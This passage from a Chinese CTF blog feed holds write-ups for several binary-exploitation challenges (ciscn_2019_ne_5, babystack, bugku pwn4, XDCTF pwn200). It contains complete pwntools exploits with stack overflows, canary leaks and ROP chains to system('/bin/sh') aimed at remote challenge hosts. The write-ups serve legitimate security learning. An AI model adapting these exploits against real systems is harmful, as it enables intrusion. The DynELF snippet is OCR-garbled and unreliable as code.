  char v8[96]; // [esp+88h] [ebp-78h] BYREF
  int *v9; // [esp+F4h] [ebp-Ch]

  v9 = &amp;argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 48;
  memset(v6, 0, sizeof(v6));
  puts(&quot;Welcome to use LFS.&quot;);
  printf(&quot;Please input admin password:&quot;);
  __isoc99_scanf(&quot;%100s&quot;, s1);
  if ( strcmp(s1, &quot;administrator&quot;) )
  {
    puts(&quot;Password Error!&quot;);
    exit(0);
  }
  puts(&quot;Welcome!&quot;);
  puts(&quot;Input your operation:&quot;);
  puts(&quot;1.Add a log.&quot;);
  puts(&quot;2.Display all logs.&quot;);
  puts(&quot;3.Print all logs.&quot;);
  printf(&quot;0.Exit\n:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 2:
      Display(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
    default:
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
;
</code></pre>
<p>发现这里代码很长，我们主要关注重点和大概浏览一下这个程序是干嘛的</p>
<pre><code> *(_DWORD *)s1 = 48;
__isoc99_scanf(&quot;%100s&quot;, s1);
  if ( strcmp(s1, &quot;administrator&quot;) )
  {
    puts(&quot;Password Error!&quot;);
    exit(0);
  }
  and
  case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
</code></pre>
<p>看到这几个代码，我们可以发现s1只有48，但是scanf写入100了这边存在溢出漏洞，而且密码已经给出来了administrator。。。然后我们发现本身就有getflag这样的函数，我们点进去查看</p>
<pre><code>int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf(&quot;The flag is your log:%s\n&quot;, dest);
}
</code></pre>
<p>我们发现他给的flag就是 src直接复制给dest然后输出给我们，src这里我们怎么获得?<br>
获得就是要先输入1  添加一个log再选4调用getflag<br>
我们来查看addlog这个函数</p>
<pre><code>int __cdecl AddLog(int a1)
{
  printf(&quot;Please input new log info:&quot;);
  return __isoc99_scanf(&quot;%128s&quot;, a1);
}
</code></pre>
<p>然后我们发现这里又可以进行溢出，a1是main函数的src给的是48，这里是读入128长度的字符串，可以造成溢出然后将返回地址覆盖为/bin/sh然后将flag丢进去我们再用4调出来<br>
返回ida按下shift+F12可以查看有system函数<br>
system_addr=0x080484D0<br>
或者网上的方法:system_addr=elf.sym['system']<br>
然后我们就想办法得到/bin/sh  做题的时候找好久都没找出来...<br>
直至百度....<br>
ROPgadget --binary ciscn_2019_ne_5 --string '/bin/sh'<br>
ROPgadget --binary ciscn_2019_ne_5 --string 'sh'<br>
显示地址0x080482ea:sh<br>
这里可以得到第一个payload='0x48+4'+p32(system_addr)+'sbsb'+p32(sh_addr)<br>
EXP如下:</p>
<pre><code>from pwn import*

#q=process(./ciscn_2019_ne_5)
q=remote(&quot;node4.buuoj.cn&quot;,27088)

#q.recvuntil('Please input admin password:')
q.sendline('administrator')


#q.recvuntil('0.Exit\n:')
q.sendline('1')

system_addr=0x080484D0
sh_addr=0x080482ea

payload='a'*(0x48+4)+p32(system_addr)+'bbbb'+p32(sh_addr)
q.sendline(payload)
#q.recvuntil('0.Exit\n:')
q.sendline('4')

#q.sendline('cat flag')
q.interactive()
</code></pre>
<p>flag:flag{ab30483c-2f22-412a-bc6a-9430b24c8041}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[One-gadget]]></title>
        <id>https://cc-nianchu.github.io/post/one-gadget/</id>
        <link href="https://cc-nianchu.github.io/post/one-gadget/">
        </link>
        <updated>2021-07-23T11:42:00.000Z</updated>
        <content type="html"><![CDATA[<p>one-gadget是libc中存在的一些执行execve('/bin/sh),NULL,NULL)的片段<br>
条件</p>
<ul>
<li>1.知道libc版本</li>
<li>2.通过信息泄漏得到libc基址<br>
结果：通过控制EIP/RIP（覆盖got.plt或者函数返回地址）执行gadget达到远程代码执行，获得shell</li>
</ul>
<h2 id="攻防世界进阶区pwn1-babystack">攻防世界进阶区pwn1 babystack</h2>
<p>给的附近有一个二进制文件和一个libc-2.23.so<br>
条件一已经满足只有libc版本</p>
<pre><code>Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>首先发现这是64位系统并且开了canary和NX保护<br>
<img src="https://cc-nianchu.github.io/post-images/1627042794369.png" alt="" loading="lazy"><br>
因为知道了libc版本，我们这里使用One-gadget</p>
<pre><code>one_gadget libc-2.23.so
0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
</code></pre>
<p>这里可以得到execve_addr = 0x45216<br>
因为这里开了canary，我们首先得canary的值算出来<br>
可以看出v6储存的是canary，s是我们输入的字符串，二者相距0x88字节。<br>
则我们先输入0x88个字节，再利用print函数就可以把canary的值带出来</p>
<pre><code>payload1 = 'A'*0x88
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload1)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)
r.recvuntil('A'*0x88+'\n')
canary = u64(r.recv(7).rjust(8,'\x00'))
</code></pre>
<p>有了canary的值我们可以进行溢出，64位程序溢出还需要一个pop rdi;ret<br>
//我也不太懂，书里这样子写。。。<br>
可以输入ROPgadget --binary babystack --only &quot;pop|ret&quot;<br>
得到0x0000000000400a93 : pop rdi ; ret<br>
解题思路：<br>
我们用one_gadget libc文件名来查找one_gadget。<br>
①这道题主要是绕过canary，然后栈溢出getshell。<br>
②经分析，read函数读入到s处，可以溢出。<br>
③put函数输出s的内容，遇到’\x00’才停止，即使字符串中存在’\n’,也会继续输出，用来泄露canary的值。<br>
④泄露出canary的值后，通过read函数溢出，泄露出read函数地址，得到libc基址。<br>
⑤用onegadget直接找到execve的地址，再次溢出，跳转到此地址获得shell<br>
EXP:</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='amd64',os='linux')
elf = ELF('./babystack')
libc = ELF('./libc-2.23.so')
r = remote(&quot;111.198.29.45&quot;,51596)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
execve = 0x45216 #one_gadget得到
main_addr = 0x400908 #main函数地址
rdi_addr = 0x400a93 #pop rdi;ret

payload1 = 'A'*0x88 #s和canary距离
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload1) #要使用sendline，即输入'A'*0x88后还要有一个回车，目的是将canary尾部的'\x00'覆盖为'\x0A'
#用puts函数输出canary时，puts函数遇到'\x00'会截断，使用'\x0A'覆盖'\x00'，才能将canary输出
#注意，本程序是小端字节序（低位地址对应高位字节）
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)
r.recvuntil('A'*0x88+'\n') #要等到'\n'之后再读取
canary = u64(r.recv(7).rjust(8,'\x00')) #r.recv(7)是由于puts输出的canary最后一位是'\x0A',要重新换成'\x00'

payload2 = 'A'*0x88
payload2+=p64(canary)+p64(0xdeadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)# 调用puts函数将puts函数的地址输出
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload2)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
puts_addr = u64(r.recv(8).ljust(8,'\x00'))

offset = puts_addr - libc.symbols['puts']
execve_addr = offset + execve

payload3 = 'A'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(execve_addr)

r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload3)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
r.interactive()

r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
r.sendline(payload3)
r.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[再战canary--尝试使用gdb]]></title>
        <id>https://cc-nianchu.github.io/post/zai-zhan-canary-chang-shi-shi-yong-gdb/</id>
        <link href="https://cc-nianchu.github.io/post/zai-zhan-canary-chang-shi-shi-yong-gdb/">
        </link>
        <updated>2021-07-21T09:41:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="题目为bugku-pwn4">题目为bugku pwn4</h2>
<p>先checksec一下看有什么保护和啥类型程序</p>
<pre><code>pwndbg&gt; checksec
[*] '/home/nianchu/Desktop/bugku/pwn4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现有Canary和NX保护，使用IDA64查看题目文件按F5反编译得伪代码</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+248h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();
  write(1, &quot;Welcome!\n&quot;, 0x10uLL);
  write(1, &quot;Please leave your name(Within 36 Length):&quot;, 0x29uLL);
  read(0, buf, 0x300uLL);
  printf(&quot;Hello %s\n&quot;, buf);
  write(1, &quot;Please leave a message(Within 0x200 Length):&quot;, 0x2CuLL);
  read(0, v5, 0x300uLL);
  printf(&quot;your message is :%s \nBye~&quot;, v5);
  return 0;
}
</code></pre>
<p><img src="https://cc-nianchu.github.io/post-images/1626860885192.png" alt="" loading="lazy"><br>
主要关注.text:000000000040082C                 mov     rax, fs:28h<br>
和.text:0000000000400835                  mov    [rbp+var_8], rax<br>
<img src="https://cc-nianchu.github.io/post-images/1626861002377.png" alt="" loading="lazy"><br>
canary存在rbp+var_8，可以在0x40082C下断点，观察下。<br>
下断点在0x40082C并输入r运行<br>
<img src="https://cc-nianchu.github.io/post-images/1626861151630.png" alt="" loading="lazy"><br>
输入n后发现rax的寄存器从0x400814变成0xfd158aa9e4871200<br>
并且发现rax的值要赋给rbp-8<br>
canary在内存是这样的<br>
<img src="https://cc-nianchu.github.io/post-images/1626861272714.png" alt="" loading="lazy"><br>
所以现在的思路是首先依据第一次回显泄露canary的值，第二次通过利用泄露的canary值实现栈溢出。<br>
64位程序优先通过寄存器rdi传参，所以先找pop rdi ； ret<br>
利用命令ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;<br>
可以找到如下结果，我们选择0x400963（选个简单的）<br>
还差一个/bin/sh我们可以在ida上按shift+F12 找到<br>
<img src="https://cc-nianchu.github.io/post-images/1626861450260.png" alt="" loading="lazy"><br>
最终如下<br>
<img src="https://cc-nianchu.github.io/post-images/1626861486228.jpg" alt="" loading="lazy"><br>
完整exp：</p>
<pre><code># -- coding:utf-8 
from pwn import *
#p = process(&quot;./pwn4&quot;)
context.log_level = 'debug'
p = remote(&quot;114.67.246.176&quot;,15575)
p.recvuntil(&quot;(Within 36 Length)&quot;)
payload=&quot;a&quot;*(0x240-0x8) #canary在rbp-8的位置
p.sendline(payload)
#0a	12	87	e4	a9	8a	15	fd
#\n         0a是\n 16进制
canary_addr=u64('\x00'+p.recv(7)) 
#system函数地址，用ida可以查
system_addr = 0x400660
#ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;
#0x0000000000400963 : pop rdi ; ret
pop_rdi_ret = 0x400963
#/bin/sh地址 ida shift+F12可获得
binsh_addr =0x601068
payload ='a'*(0x210-0x8)

payload += p64(canary_addr)
#rbp
payload += p64(0x1)

payload += p64(pop_rdi_ret)

payload += p64(binsh_addr)

payload += p64(system_addr)

p.recv()
p.sendline(payload)
p.interactive()
</code></pre>
<p>最后来个笔记<br>
<img src="https://cc-nianchu.github.io/post-images/1626862721188.jpg" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DynELF]]></title>
        <id>https://cc-nianchu.github.io/post/dynelf/</id>
        <link href="https://cc-nianchu.github.io/post/dynelf/">
        </link>
        <updated>2021-07-21T04:27:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="dynelf原理">DynELF原理</h2>
<p>通过信息泄露漏洞，DynELF将对任意内存进行搜索,它首先找到ELF文件在内存中的基地址，然后定位到libe并对其进行解析，从而找到所需函数符号的地址，具体步骤如下。</p>
<p>(1)搜索内存找到字符串“\x7ELF”， 该字符串的地址即为ELF的基地址;</p>
<p>(2)解析ELF文件，得到DYNAMIC段的基地址，并通过该地址得到link map链表，此时有两种方法:一种 是通过.dynamic里的DT DEBUG,它是一个指向 structr debug的指针，其第二个元素指向link map;另一种是通过.got.plt节，其前3项分别是.dynamic、link_ map 和dl _runtime resolve的地址;</p>
<p>(3 )遍历link map,对比1_ name找到libc后，通过1 addr获得libc的基地址;</p>
<p>( 4)解析libc,通过DT_ _GNU HASH、DT STRTAB:和DT SYMTAB分别得到哈希表( .gnu hash/ .hash)、字符串表(sttab )和符号表( symtab );</p>
<p>(5)通过哈希表找到所需函数(如system )的内存地址。</p>
<h2 id="例题-xdctf-2015pwn200-攻防世界进阶区第二题">例题 XDCTF 2015:pwn200  攻防世界进阶区第二题</h2>
<p>获得题目后先checksec pwn_200</p>
<pre><code> Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>打开ida32 F5获得伪代码</p>
<pre><code>int __cdecl main()
{
  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF

  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
  memset(&amp;buf[24], 0, 0x4Cu);
  setbuf(stdout, buf);
  write(1, buf, strlen(buf));
  sub_8048484();
  return 0;
}
ssize_t sub_8048484()
{
  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
</code></pre>
<h3 id="程序分析">程序分析</h3>
<p>漏洞比较明显，sub 80484840函数试图读取010个字节到个0x6e字节大小的buf上，存在缓冲区溢出漏洞。由于没有Canay,我们可以很轻松地在栈上布置ROP链、并控制EIP。只需要注意32位程序通过栈传递参数。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>(1)利用栈溢出，在栈上布置ROP链，修改返回地址，从而控制EIP:</p>
<p>(2 )利用wrieO函数构造DynELF的leak函数，进行信息泄露，从而得到libe,从中查找system0函数的地址;</p>
<p>(3)利用read(0函数将字符串“in/hsx00&quot; 读人.bss 节;</p>
<p>(4)调用system(&quot;/bin/sh&quot;),获得shell.</p>
<p>第一阶段利用DynELF泄露得到system()函数的内存地址，leak func()如下所示。</p>
<pre><code>def leak func (addr) :

io. recvline ()

payload= &quot;А&quot;*(0хбс +4)

payload += p32 (write_ plt)

# write(1, addr, 4)

payload += p32 (pppr_addr)

clean the stack

payload += p32 (1)

payload += p32 (addr)

payload += p32 (4)

payload += p32(_start_addr)                 # start again

io. send (payload)

data = io. recv(4)

log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex')))
return data
</code></pre>
<p>每次执行write()函数后，都需要一个&quot;pop;pop;pop;ret&quot;的gadget将3个参数弹出，从而使栈达到平衡，然后再返回到start函数开启下一轮，从而满足DynELF需要循环泄漏的条件</p>
]]></content>
    </entry>
</feed>